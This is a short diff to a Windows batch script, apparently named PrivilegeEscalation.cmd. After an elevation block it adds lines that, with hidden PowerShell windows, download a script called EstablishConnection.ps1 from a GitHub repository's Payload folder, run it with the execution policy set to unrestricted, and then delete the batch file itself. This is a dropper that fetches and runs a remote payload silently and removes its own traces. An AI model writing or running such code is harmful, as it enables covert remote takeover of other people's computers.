@@ -23,3 +23,7 @@ if '%ERRORLEVEL%' NEQ '0' (
 :GotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+
+powershell -windowstyle hidden Invoke-WebRequest -Uri "https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1" -OutFile "EstablishConnection.ps1"
+powershell -windowstyle hidden -ep unrestricted "./EstablishConnection.ps1"
+del PrivilegeEscalation.cmd
